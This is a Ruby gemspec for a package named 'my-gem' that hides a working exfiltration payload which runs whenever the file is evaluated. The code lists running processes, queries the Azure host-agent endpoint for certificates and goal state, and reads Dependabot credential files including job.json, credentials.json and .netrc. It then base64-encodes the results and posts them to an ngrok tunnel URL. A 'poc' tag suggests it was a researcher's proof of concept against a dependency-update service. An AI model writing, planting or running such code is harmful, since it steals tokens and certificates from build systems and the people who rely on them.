COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "uri"

  results = []

  # Process listing - zijn andere jobs zichtbaar?
  pids = Dir.entries("/proc").select { |e| e =~ /^\d+$/ }.map(&:to_i).sort
  results << "=== /proc PIDs (#{pids.length}) ===\n#{pids.join(' ')}"

  pids.first(50).each do |pid|
    begin
      cmdline = File.read("/proc/#{pid}/cmdline").gsub("\x00", " ").strip
      next if cmdline.empty?
      results << "[#{pid}] #{cmdline[0..200]}"
    rescue; end
  end

  # HGAP /certificates en /goalstate via directe HTTP (niet via proxy)
  ["certificates", "goalstate"].each do |endpoint|
    begin
      uri = URI("http://168.63.129.16:32526/#{endpoint}")
      req = Net::HTTP::Get.new(uri)
      resp = Net::HTTP.start(uri.host, uri.port, open_timeout: 5, read_timeout: 5) { |h| h.request(req) }
      results << "=== HGAP /#{endpoint} HTTP #{resp.code} ===\n#{resp.body[0..4000]}"
    rescue => e
      results << "=== HGAP /#{endpoint} ERR: #{e.class}: #{e.message} ==="
    end
  end

  # Credentials file locations
  [
    "/home/dependabot/dependabot-updater/job.json",
    "/home/dependabot/dependabot-updater/credentials.json",
    "/home/dependabot/.netrc",
    "/etc/dependabot/credentials",
  ].each do |path|
    begin
      content = File.read(path)
      results << "=== #{path} ===\n#{content[0..3000]}"
    rescue; end
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=procs-hgap")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
